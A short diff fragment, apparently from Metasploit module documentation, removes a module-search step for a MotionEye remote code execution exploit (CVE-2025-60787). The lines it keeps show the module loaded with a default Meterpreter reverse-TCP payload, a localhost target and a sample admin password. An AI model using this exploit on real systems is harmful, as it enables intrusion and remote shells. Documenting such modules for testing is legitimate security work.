@@ -74,18 +74,6 @@ admin / X1l9fx1ZjS7RZb
 ```
 
 ```
-msf > search exploit/linux/http/motioneye_auth_rce_cve_2025_60787
-
-Matching Modules
-================
-
-   #  Name                                                  Disclosure Date  Rank       Check  Description
-   -  ----                                                  ---------------  ----       -----  -----------
-   0  exploit/linux/http/motioneye_auth_rce_cve_2025_60787  2025-09-09       excellent  Yes    Remote Code Execution Vulnerability in MotionEye Frontend (CVE-2025-60787)
-
-
-Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
-
 msf > use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
 [*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
 msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set RHOSTS 127.0.0.1
